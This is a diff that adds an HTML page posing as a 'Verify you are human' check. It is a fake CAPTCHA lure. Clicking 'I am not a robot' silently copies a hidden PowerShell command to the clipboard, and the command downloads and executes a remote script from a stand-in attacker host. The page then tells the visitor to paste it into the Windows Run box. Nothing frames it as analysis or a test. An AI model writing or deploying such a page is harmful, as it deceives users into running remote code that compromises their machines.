@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Verify you are human</title>
+</head>
+<body>
+<button id="verify">I am not a robot</button>
+<p>Press Win+R, paste and press Enter.</p>
+<script>
+  var cmd = "powershell -w hidden -c iwr https://payload.evil-example.test/a.ps1 | iex";
+  document.getElementById("verify").onclick = function () {
+    navigator.clipboard.writeText(cmd);
+  };
+</script>
+</body>
+</html>
